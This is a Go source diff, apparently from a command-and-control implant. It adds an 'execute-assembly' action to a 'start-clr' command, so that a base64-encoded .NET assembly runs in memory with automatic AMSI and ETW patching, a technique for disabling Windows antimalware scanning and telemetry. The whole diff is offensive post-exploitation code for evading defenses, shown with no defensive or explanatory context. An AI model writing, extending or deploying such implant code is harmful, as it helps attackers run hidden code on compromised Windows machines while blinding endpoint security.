@@ -33,10 +33,24 @@ func (c *StartCLRCommand) Description() string {
 type StartCLRParams struct {
 	AmsiPatch string `json:"amsi_patch"`
 	EtwPatch  string `json:"etw_patch"`
+	Action    string `json:"action"`
+	Assembly  string `json:"assembly"`  // base64-encoded .NET assembly for execute-assembly
+	Arguments string `json:"arguments"` // arguments for the assembly
 }
 
 // Execute executes the start-clr command
 func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
+	// Parse params early to check for execute-assembly action
+	params, parseErr := unmarshalParams[StartCLRParams](task)
+	if parseErr != nil {
+		return *parseErr
+	}
+
+	// Handle execute-assembly action (separate flow with auto-patching)
+	if params.Action == "execute-assembly" {
+		return executeAssemblyAction(params.Assembly, params.Arguments)
+	}
+
 	// Use the shared assemblyMutex from inlineassembly.go for CLR state
 	assemblyMutex.Lock()
 	defer assemblyMutex.Unlock()
@@ -46,11 +60,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: This command is only supported on Windows")
 	}
 
-	// Parse parameters (default to "None" if empty/missing for backward compat)
-	params, parseErr := unmarshalParams[StartCLRParams](task)
-	if parseErr != nil {
-		return *parseErr
-	}
+	// Default patch values for backward compat
 	if params.AmsiPatch == "" {
 		params.AmsiPatch = "None"
 	}
